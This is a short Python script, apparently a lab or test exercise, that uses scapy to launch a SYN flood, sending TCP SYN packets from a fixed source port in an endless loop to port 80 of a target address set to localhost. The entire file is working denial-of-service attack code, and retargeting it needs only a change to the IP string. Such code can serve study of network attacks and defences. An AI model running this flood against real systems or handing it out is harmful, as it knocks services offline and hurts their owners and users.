from scapy.all import IP, TCP, send

target_ip = "127.0.0.1"
target_port = 80

print("Starting SYN Flood (fixed flow)...")

while True:
    packet = IP(dst=target_ip) / TCP(
        sport=12345,     # FIXED
        dport=target_port,
        flags="S"
    )

    send(packet, verbose=0, loop=1)